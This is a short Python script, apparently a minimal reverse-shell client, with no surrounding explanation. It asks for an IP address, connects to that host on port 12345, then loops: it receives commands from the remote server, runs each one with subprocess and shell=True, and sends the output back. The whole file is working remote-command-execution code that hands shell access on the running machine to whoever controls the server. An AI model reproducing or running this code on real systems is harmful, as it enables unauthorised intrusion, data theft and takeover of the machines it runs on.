import socket
import subprocess

# Define the server's host and port
server_host = input("THE IP: ")  # localhost
server_port = 12345        # same port number as server

# Create a socket object
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the server
client.connect((server_host, server_port))

while True:
    # Receive command from the server
    command = client.recv(1024).decode().strip()

    if not command:
        break  # Exit the loop if no command received
    # Execute the command locally
    try:
        output = subprocess.check_output(command, shell=True)
    except subprocess.CalledProcessError as e:
        output = str(e).encode()

    # Send the output back to the server
    client.send(output)

# Close the connection
client.close()
